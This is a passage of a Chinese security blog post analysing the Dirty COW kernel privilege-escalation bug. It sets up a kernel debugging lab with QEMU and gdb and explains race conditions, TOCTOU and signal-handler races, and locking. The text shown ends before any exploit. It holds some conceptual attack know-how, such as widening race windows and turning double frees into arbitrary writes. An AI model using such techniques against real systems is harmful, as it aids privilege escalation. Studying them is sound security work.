<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="fa1lr4in">
    
    <title>
        
            CVE-2016-5195 dirtycow linux本地提权漏洞分析 |
        
        fa1lr4in&#39;s blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/logo.svg">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/css/font-awesome.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"fa1lr4in.github.io","root":"/","language":"en","path":"search.json"};
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.svg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"男儿何不带吴钩，收取关山五十州。"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.5"};
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
  </script>
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
</head>


<body>
<div class="progress-bar-container">
    

    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            <header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                fa1lr4in&#39;s blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                HOME
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                ARCHIVES
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                CATEGORIES
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                TAGS
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                ABOUT
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">HOME</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">ARCHIVES</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">CATEGORIES</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">TAGS</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">ABOUT</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="article-content-container">

        <div class="article-title">
            <span class="title-hover-animation">CVE-2016-5195 dirtycow linux本地提权漏洞分析</span>
        </div>

        
            <div class="article-header">
                <div class="avatar">
                    <img src="/images/avatar.svg">
                </div>
                <div class="info">
                    <div class="author">
                        <span class="name">fa1lr4in</span>
                        
                            <span class="author-label">Lv2</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fas fa-edit"></i>&nbsp;
        <span class="pc">2022-05-10 16:26:18</span>
        <span class="mobile">2022-05-10 16:26</span>
    </span>
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/linux/">linux</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>17.9k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>70 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        <div class="article-content markdown-body">
            <h1 id="CVE-2016-5195-dirtycow-linux本地提权漏洞分析"><a href="#CVE-2016-5195-dirtycow-linux本地提权漏洞分析" class="headerlink" title="CVE-2016-5195 dirtycow linux本地提权漏洞分析"></a>CVE-2016-5195 dirtycow linux本地提权漏洞分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>脏牛（Dirty COW）漏洞名称源于linux内核的写时复制（Copy-on-Write）的首字母缩写。该漏洞于2016年10月18日由Phil Oester提交，并于2016年10月20日由Linus修复。该漏洞影响2.6.22到4.8.3, 4.7.9, 4.4.26之前的版本。影响版本可以<a class="link"   target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io/wiki/Patched-Kernel-Versions" >参考<i class="fas fa-external-link-alt"></i></a></p>
<p>该漏洞是Linux内核的内存子系统在处理写时拷贝（Copy-on-Write)时存在条件竞争漏洞，导致可以破坏私有只读内存映射。从而修改任意文件，甚至低权限用户通过该漏洞可提升至root权限。</p>
<p>该漏洞为笔者在分析DirtyPipe后重温经典漏洞，该漏洞影响范围较大。参考了网络上公开的一些分析，发现有许多分析比较混乱，看完给人一头雾水的感觉。笔者尽量用简介与清晰的描述完成此篇分析。</p>
<p>比较推荐一篇精炼的<a class="link"   target="_blank" rel="noopener" href="https://atum.li/2016/10/25/dirtycow/" >分析<i class="fas fa-external-link-alt"></i></a>。没有废话，全程干货。还有<a class="link"   target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/11/18/race/" >该文章<i class="fas fa-external-link-alt"></i></a>写的也是不错的。</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="零、前言"><a href="#零、前言" class="headerlink" title="零、前言"></a>零、前言</h3><p>前置知识非必须，如果读者十分了解相关的机制，则可以直接查看漏洞分析的部分，笔者会用尽量精炼的语言和清晰的逻辑来阐述相关漏洞原理。</p>
<h3 id="一、linux内核调试环境编译"><a href="#一、linux内核调试环境编译" class="headerlink" title="一、linux内核调试环境编译"></a>一、linux内核调试环境编译</h3><p>搭建过程主要参考了<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/hellochristie/article/details/78230734" >该文章<i class="fas fa-external-link-alt"></i></a>。</p>
<h4 id="0、严重的错误"><a href="#0、严重的错误" class="headerlink" title="0、严重的错误"></a>0、严重的错误</h4><p>在ubuntu20.04运行如下的安装步骤时会出现如下问题</p>
<p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220419142819926.png" alt="image-20220419142819926"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Booting from ROM...</span><br><span class="line">early console <span class="keyword">in</span> decompress_kernel</span><br><span class="line">input_data: 0x000000000191524d</span><br><span class="line">input_len: 0x00000000005e4b5c</span><br><span class="line">output: 0x0000000001000000</span><br><span class="line">output_len: 0x0000000000ee88b8</span><br><span class="line">run_size: 0x0000000000ff4000</span><br><span class="line"></span><br><span class="line">Decompressing Linux... Parsing ELF...</span><br></pre></td></tr></table></figure>

<p>在qemu运行时将会一直卡在上面的界面上。</p>
<p>经过较长时间的寻找，在<a class="link"   target="_blank" rel="noopener" href="https://vccolombo.github.io/cybersecurity/linux-kernel-qemu-stuck/" >该博客<i class="fas fa-external-link-alt"></i></a>中寻找到了解决方案，遂尝试从ubuntu18.04进行漏洞实验，环境搭建成功。</p>
<h4 id="1、源码获取"><a href="#1、源码获取" class="headerlink" title="1、源码获取"></a>1、源码获取</h4><p>首先拖源码与补丁（这里也可以下载其他版本）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.4.1.tar.gz</span><br><span class="line">wget https://cdn.kernel.org/pub/linux/kernel/v4.x/patch-4.4.1.xz</span><br><span class="line">tar zxvf linux-4.4.1.tar.gz </span><br><span class="line">xz -d patch-4.4.1.xz | patch -p1							<span class="comment"># 这里没有输出代表执行成功</span></span><br></pre></td></tr></table></figure>

<h4 id="2、内核编译"><a href="#2、内核编译" class="headerlink" title="2、内核编译"></a>2、内核编译</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> linux-4.4.1</span><br><span class="line">make x86_64_defconfig		   <span class="comment"># 加载默认config</span></span><br><span class="line">make menuconfig		<span class="comment"># 自定义config</span></span><br></pre></td></tr></table></figure>

<p>要进行打断点调试，需要关闭系统的随机化和开启调试信息：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Processor type and features  ---&gt; </span><br><span class="line">    [ ] Build a relocatable kernel                                               </span><br><span class="line">        [ ]  Randomize the address <span class="keyword">of</span> the kernel image (KASLR) (NEW) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Kernel hacking  ---&gt;</span><br><span class="line">    Compile-time checks and compiler options  ---&gt;  </span><br><span class="line">        [*] Compile the kernel <span class="keyword">with</span> debug info                                                                  </span><br><span class="line">        [ ]   Reduce debugging information                                                                      </span><br><span class="line">        [ ]   Produce split debuginfo <span class="keyword">in</span> .dwo files                                                             </span><br><span class="line">        [*]   Generate dwarf4 debuginfo                                         </span><br><span class="line">        [*]   Provide GDB scripts <span class="keyword">for</span> kernel debugging</span><br></pre></td></tr></table></figure>

<p>之后进行编译</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j32</span><br></pre></td></tr></table></figure>

<p>如果遇到编译错误<code>cc1: error: code model kernel does not support PIC mode</code>，则在MakeFile中的KBUILD_CFLAGS选项中加入<code>-fno-pie</code></p>
<p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220411110701269.png" alt="image-20220411110701269"></p>
<p>之后在进行make即可。</p>
<h4 id="3、加载文件系统镜像"><a href="#3、加载文件系统镜像" class="headerlink" title="3、加载文件系统镜像"></a>3、加载文件系统镜像</h4><p>这里可以使用<code>syzkaller</code>的生成脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> linux-4.4.1</span><br><span class="line">sudo apt-get install debootstrap</span><br><span class="line">wget https://github.com/google/syzkaller/blob/master/tools/create-image.sh -O create-image.sh	<span class="comment"># 这里我得到的是一个html页面，最终笔者自行访问页面复制了相关的代码。</span></span><br><span class="line">chmod +x create-image.sh</span><br><span class="line">./create-image.sh				<span class="comment"># 这里会在当前目录生成 stretch.img</span></span><br></pre></td></tr></table></figure>

<h4 id="4、启动qemu"><a href="#4、启动qemu" class="headerlink" title="4、启动qemu"></a>4、启动qemu</h4><p>这里的<code>-nographic</code>以及<code>-s</code>一定要加，执行命令后会启动生成的linux系统，并得到一个shell，这里可以不指定-net参数，默认会有一个NAT的网络，可以访问外网。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> linux-4.4.1 &amp;&amp;</span><br><span class="line">sudo qemu-system-x86_64 \</span><br><span class="line">	-s \</span><br><span class="line">    -kernel ./arch/x86/boot/bzImage \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 root=/dev/sda earlyprintk=serial&quot;</span>\</span><br><span class="line">    -drive file=./stretch.img,format=raw \</span><br><span class="line">    -nographic</span><br><span class="line">    -pidfile vm.pid \</span><br><span class="line">    2&gt;&amp;1 | tee vm.log</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220316173537546-16496426175211.png" alt="image-20220316173537546"></p>
<p>命令行参数如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-s              shorthand <span class="keyword">for</span> -gdb tcp::1234</span><br><span class="line">-append cmdline use <span class="string">&#x27;cmdline&#x27;</span> as kernel <span class="built_in">command</span> line</span><br><span class="line">-net nic[,macaddr=mac][,model=<span class="built_in">type</span>][,name=str][,addr=str][,vectors=v]</span><br><span class="line">                configure or create an on-board (or machine default) NIC and</span><br><span class="line">                connect it to hub 0 (please use -nic unless you need a hub) </span><br><span class="line">-enable-kvm 开启kvm，这里不要加，否则调试时会直接跳转到__sysvec_apic_timer_interrupt</span><br></pre></td></tr></table></figure>

<h4 id="5、gdb调试"><a href="#5、gdb调试" class="headerlink" title="5、gdb调试"></a>5、gdb调试</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> linux-4.4.1</span><br><span class="line">gdb vmlinux</span><br><span class="line">gef➤  target remote:1234		<span class="comment"># 连接到远程调试接口</span></span><br><span class="line"><span class="comment"># 后面就可以正常进行调试了</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220316174104667.png" alt="image-20220316174104667"></p>
<h3 id="二、条件竞争漏洞"><a href="#二、条件竞争漏洞" class="headerlink" title="二、条件竞争漏洞"></a>二、条件竞争漏洞</h3><h4 id="1、定义"><a href="#1、定义" class="headerlink" title="1、定义"></a>1、定义</h4><p><a class="link"   target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/race-condition/introduction/" >race-condition<i class="fas fa-external-link-alt"></i></a>中文一般称为条件竞争，指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现bug。这个术语最初来自于两个电信号互相竞争来影响输出结果。</p>
<h4 id="2、触发条件"><a href="#2、触发条件" class="headerlink" title="2、触发条件"></a>2、触发条件</h4><p>由于目前的系统中大量采用并发编程，经常对资源进行共享，往往会产生条件竞争漏洞。当一个软件的运行结果依赖于进程或者线程的顺序时，就可能会出现条件竞争。简单考虑一下，可以知道条件竞争需要如下的<strong>条件</strong>：</p>
<ul>
<li>并发，即至少存在两个并发执行流。这里的执行流包括线程，进程，任务等级别的执行流。</li>
<li>共享对象，即多个并发流会访问同一对象。<strong>常见的共享对象有共享内存，文件系统，信号。一般来说，这些共享对象是用来使得多个程序执行流相互交流。</strong>此外，我们称访问共享对象的代码为<strong>临界区</strong>。在正常写代码时，这部分应该加锁。</li>
<li>改变对象，即至少有一个控制流会改变竞争对象的状态。因为如果程序只是对对象进行读操作，那么并不会产生条件竞争。</li>
</ul>
<h4 id="3、例子"><a href="#3、例子" class="headerlink" title="3、例子"></a>3、例子</h4><p>由于在并发时，执行流的不确定性很大，条件竞争相对<strong>难察觉</strong>，并且在<strong>复现和调试方面会比较困难</strong>。这给修复条件竞争也带来了不小的困难。</p>
<p>条件竞争造成的影响也是多样的，轻则程序异常执行，重则程序崩溃。如果条件竞争漏洞被攻击者利用的话，很有可能会使得攻击者获得相应系统的特权。</p>
<p>这里举一个简单的例子。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> counter;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">IncreaseCounter</span><span class="params">(<span class="keyword">void</span> *args)</span> </span>&#123;</span><br><span class="line">  counter += <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">0.1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Thread %d has counter value %d\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">pthread_self</span>(),</span><br><span class="line">         counter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">pthread_t</span> p[<span class="number">10</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">    <span class="built_in">pthread_create</span>(&amp;p[i], <span class="literal">NULL</span>, IncreaseCounter, <span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">    <span class="built_in">pthread_join</span>(p[i], <span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一般来说，我们可能希望按如下方式输出</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  005race_condition ./example1</span><br><span class="line">Thread 1859024640 has counter value 1</span><br><span class="line">Thread 1841583872 has counter value 2</span><br><span class="line">Thread 1832863488 has counter value 3</span><br><span class="line">Thread 1824143104 has counter value 4</span><br><span class="line">Thread 1744828160 has counter value 5</span><br><span class="line">Thread 1736107776 has counter value 6</span><br><span class="line">Thread 1727387392 has counter value 7</span><br><span class="line">Thread 1850304256 has counter value 8</span><br><span class="line">Thread 1709946624 has counter value 9</span><br><span class="line">Thread 1718667008 has counter value 10</span><br></pre></td></tr></table></figure>

<p>但是，由于条件竞争的存在，最后输出的结果往往不尽人意</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  005race_condition ./example1</span><br><span class="line">Thread 1417475840 has counter value 2</span><br><span class="line">Thread 1408755456 has counter value 2</span><br><span class="line">Thread 1391314688 has counter value 8</span><br><span class="line">Thread 1356433152 has counter value 8</span><br><span class="line">Thread 1365153536 has counter value 8</span><br><span class="line">Thread 1373873920 has counter value 8</span><br><span class="line">Thread 1382594304 has counter value 8</span><br><span class="line">Thread 1400035072 has counter value 8</span><br><span class="line">Thread 1275066112 has counter value 9</span><br><span class="line">Thread 1266345728 has counter value 10</span><br></pre></td></tr></table></figure>

<p>仔细思考一下条件竞争为什么可能会发生呢？以下面的为具体的例子</p>
<ul>
<li>程序首先执行了 action1，然后执行了 action2。其中 action 可能是应用级别的，也可能是操作系统级别的。正常来说，我们希望程序在执行 action2 时，action1 所产生的条件仍然是满足的。</li>
<li>但是由于程序的并发性，攻击者很有可能可以在 action2 执行之前的这个短暂的时间窗口中破坏 action1 所产生的条件。这时候攻击者的操作与 action2 产生了条件竞争，所以可能会影响程序的执行效果。</li>
</ul>
<p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/time_interval.png" alt="img"></p>
<p>所以问题的根源在于程序员虽然假设某个条件在相应时间段应该是满足的，但是往往条件可能会在这个很小的时间窗口中被修改。<strong>虽然这个时间的间隔可能非常小，但是攻击者仍然可能可以通过执行某些操作（如计算密集型操作，Dos 攻击）使得受害机器的处理速度变得相对慢一些。</strong></p>
<h4 id="4、形式"><a href="#4、形式" class="headerlink" title="4、形式"></a>4、形式</h4><p>常见的条件竞争有以下形式。</p>
<h5 id="CWE-367-TOCTOU-Race-Condition"><a href="#CWE-367-TOCTOU-Race-Condition" class="headerlink" title="CWE-367: TOCTOU Race Condition"></a>CWE-367: TOCTOU Race Condition</h5><h6 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h6><p>TOCTOC (Time-of-check Time-of-use) 指的是程序在使用资源（变量，内存，文件）前会对进行检查，但是在程序使用对应的资源前，该资源却被修改了。</p>
<p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/toctou.png" alt="img"></p>
<p>下面给出一些更加具体的例子。</p>
<h6 id="CWE-365-Race-Condition-in-Switch"><a href="#CWE-365-Race-Condition-in-Switch" class="headerlink" title="CWE-365: Race Condition in Switch"></a>CWE-365: Race Condition in Switch</h6><p>当程序正在执行 switch 语句时，如果 switch 变量的值被改变，那么就可能造成不可预知的行为。尤其在 case 语句后不写 break 语句的代码，一旦 switch 变量发生改变，很有可能会改变程序原有的逻辑。</p>
<h6 id="CWE-363-Race-Condition-Enabling-Link-Following"><a href="#CWE-363-Race-Condition-Enabling-Link-Following" class="headerlink" title="CWE-363: Race Condition Enabling Link Following"></a>CWE-363: Race Condition Enabling Link Following</h6><p>我们知道 Linux 中提供了两种对于文件的命名方式</p>
<ul>
<li>文件路径名</li>
<li>文件描述符</li>
</ul>
<p>但是，将这两种命名解析到相应对象上的方式有所不同</p>
<ul>
<li>文件路径名在解析的时候是通过传入的路径（文件名，硬链接，软连接）<strong>间接解析</strong>的，其传入的参数并不是相应文件的真实地址 (inode)。</li>
<li>文件描述符通过访问直接指向文件的指针来解析。</li>
</ul>
<p>正是由于间接性，产生了上面我们所说的时间窗口。</p>
<p>以下面的代码为例子，程序在访问某个文件之前，会检查是否存在，之后会打开文件然后执行操作。但是如果在检查之后，真正使用文件之前，攻击者将文件修改为某个符号链接，那么程序将访问错误的文件。</p>
<p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/race_condition_file.png" alt="img"></p>
<p>这种条件竞争出现的问题的根源在于文件系统中的名字对象绑定的问题。而下面的函数都会使用文件名作为参数：access(), open(), creat(), mkdir(), unlink(), rmdir(), chown(), symlink(), link(), rename(), chroot(),…</p>
<p>那该如何避免这个问题呢？我们可以使用 fstat 函数来读取文件的信息并把它存入到 stat 结构体中，然后我们可以将该信息与我们已知的信息进行比较来判断我们是否读入了正确的信息。其中，stat 结构体中的 <code>st_ino</code> 和 <code>st_dev</code> 变量可以唯一表示文件</p>
<ul>
<li><code>st_ino</code> ，包含了文件的序列号，即 <code>i-node</code></li>
<li><code>st_dev</code> ，包含了文件对应的设备。</li>
</ul>
<p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/race_condition_identify_file.png" alt="img"></p>
<h5 id="CWE-364-Signal-Handler-Race-Condition"><a href="#CWE-364-Signal-Handler-Race-Condition" class="headerlink" title="CWE-364: Signal Handler Race Condition"></a>CWE-364: Signal Handler Race Condition</h5><h6 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h6><p>条件竞争经常会发生在信号处理程序中，这是因为信号处理程序支持异步操作。尤其是当信号处理程序是<strong>不可重入</strong>的或者状态敏感的时候，攻击者可能通过利用信号处理程序中的条件竞争，可能可以达到拒绝服务攻击和代码执行的效果。比如说，如果在信号处理程序中执行了 free 操作，此时又来了一个信号，然后信号处理程序就会再次执行 free 操作，这时候就会出现 double free 的情况，再稍微操作一下，就可能可以达到任意地址写的效果了。</p>
<p>一般来说，与信号处理程序有关的常见的条件竞争情况有</p>
<ul>
<li>信号处理程序和普通的代码段共享全局变量和数据段。</li>
<li>在不同的信号处理程序中共享状态。</li>
<li>信号处理程序本身使用不可重入的函数，比如 malloc 和 free 。</li>
<li>一个信号处理函数处理多个信号，这可能会进而导致 use after free 和 double free 漏洞。</li>
<li>使用 setjmp 或者 longjmp 等机制来使得信号处理程序不能够返回原来的程序执行流。</li>
</ul>
<h6 id="线程安全与可重入"><a href="#线程安全与可重入" class="headerlink" title="线程安全与可重入"></a>线程安全与可重入</h6><p>这里说明一下线程安全与可重入的关系。</p>
<ul>
<li>线程安全<ul>
<li>即该函数可以被多个线程调用，而不会出现任何问题。</li>
<li>条件<ul>
<li>本身没有任何共享资源</li>
<li>有共享资源，需要加锁。</li>
</ul>
</li>
</ul>
</li>
<li>可重用<ul>
<li>一个函数可以被多个实例可以同时运行在相同的地址空间中。</li>
<li>可重入函数可以被中断，并且其它代码在进入该函数时，不会丢失数据的完整性。所以可重入函数一定是线程安全的。</li>
<li>可重入强调的是单个线程执行时，重新进入同一个子程序仍然是安全的。</li>
<li>不满足条件<ul>
<li>函数体内使用了静态数据结构，并且不是常量</li>
<li>函数体内使用了 malloc 或者 free 函数</li>
<li>函数使用了标准 IO 函数。</li>
<li>调用的函数不是可重入的。</li>
</ul>
</li>
<li>可重入函数使用的所有变量都保存在<a class="link"   target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%B0%83%E7%94%A8%E6%A0%88" >调用栈<i class="fas fa-external-link-alt"></i></a>的当前<a class="link"   target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E5%87%BD%E6%95%B0%E6%A0%88&action=edit&redlink=1" >函数栈<i class="fas fa-external-link-alt"></i></a>（frame）上。</li>
</ul>
</li>
</ul>
<h4 id="5、防范"><a href="#5、防范" class="headerlink" title="5、防范"></a>5、防范</h4><p>如果想要消除条件竞争，那么首要的目标是找到竞争窗口（race windows）。</p>
<p>所谓竞争窗口，就是访问竞争对象的代码段，这给攻击者相应的机会来修改相应的竞争对象。</p>
<p>一般来说，如果我们可以使得冲突的竞争窗口相互排斥，那么就可以消除竞争条件。</p>
<h5 id="同步原语"><a href="#同步原语" class="headerlink" title="同步原语"></a>同步原语</h5><p>一般来说，我们会使用同步原语来消除竞争条件。常见的如下</p>
<ul>
<li>锁变量<ul>
<li>通常互斥琐，在等待期间放弃 CPU，进入 idle 状态，过一段时间自动尝试。</li>
<li>自旋锁（spinlock），在等待期间不放弃 CPU，一直尝试。</li>
</ul>
</li>
<li>条件变量<ul>
